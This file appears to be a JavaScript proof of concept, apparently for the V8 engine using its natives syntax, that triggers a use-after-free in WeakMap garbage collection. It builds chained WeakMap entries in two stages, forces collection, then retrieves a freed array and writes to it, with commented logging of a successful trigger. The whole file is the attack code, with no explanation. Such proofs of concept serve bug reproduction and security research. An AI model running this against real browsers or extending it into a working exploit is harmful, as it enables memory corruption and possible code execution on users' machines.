
let wm = new WeakMap();
let k0 = { k: 0 };
let garbageMap = new WeakMap();

function sleep(miliseconds) {
   var currentTime = new Date().getTime();
   while (currentTime + miliseconds >= new Date().getTime()) {
   }
}
function gc() {
  new ArrayBuffer(0x4fe00000);
  //%CollectGarbage(null)
}

function restart() {
  //Should deopt main if it gets optimized
  gc();
  sleep(2000);
  main();
}

function trashGc() {
  for (let i = 0; i < 500; i++)
    garbageMap.set(k0, { k: i });
}

function crash() {
  let uaf_map = new WeakMap();

  let s1_wm = new WeakMap();
  let s1_uaf_map = new WeakMap();

  // Stage0
  let k_uaf = { k: 1337 };
  let v_uaf = s1_wm;
  let k_kuafptr = k_uaf;

  let k2 = { k: 2 };
  let v0 = { v: 0 };

  wm.set(v0, uaf_map);
  wm.set(k2, k_kuafptr);
  wm.set(k0, v0);

  uaf_map.set(k_uaf, v_uaf);
  uaf_map.set(k0, k2);

  // Stage1
  let s1_k_uaf = { k: 1337 };
  let s1_v_uaf = new Array(1<<15);;
  let s1_k_kuafptr = s1_k_uaf;

  let s1_k2 = { k: 2 };
  let s1_v0 = { v: 0 };

  s1_wm.set(s1_v0, s1_uaf_map);
  s1_wm.set(s1_k2, s1_k_kuafptr);
  s1_wm.set(k0, s1_v0);

  s1_uaf_map.set(s1_k_uaf, s1_v_uaf);
  s1_uaf_map.set(k0, s1_k2);
}

function main() {
	for (let i = 0; i < 999; i++) {
	  garbageMap.set(k0, { k: i });
		% CollectGarbage(null)
	  crash();
		% CollectGarbage(null);

	  // Stage0
	  let uaf_map = wm.get(wm.get(k0));
	  let k_uafptr = wm.get(uaf_map.get(k0));
	  let s1_wm = uaf_map.get(k_uafptr);

	  // Stage1
	  let s1_uaf_map = s1_wm.get(s1_wm.get(k0));
	  let s1_k_uafptr = s1_wm.get(s1_uaf_map.get(k0));
	  let s1_v_uaf = s1_uaf_map.get(s1_k_uafptr);

	  if (s1_v_uaf == undefined) {
		  restart();
		  return;
	  }
	  let meow= new Array(1<<13);;

	  s1_v_uaf.fill(1);
		/*
		console.log("[+] Trigger Successful");
		console.log("[*] Iteration " + i + ".");
		console.log("[+] Object value: ");
		*/
	  %DebugPrint(meow);
	}
}

main();
